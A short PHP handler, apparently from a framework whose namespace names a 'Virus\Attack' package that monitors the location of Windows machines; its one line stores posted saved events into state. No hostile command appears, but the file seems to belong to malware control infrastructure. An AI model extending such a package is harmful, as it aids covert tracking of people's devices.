<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorLocation\MonitorLocation $this */

$this->setSavedEvents($this->requestData->postCheck("savedEvents"))->saveState();
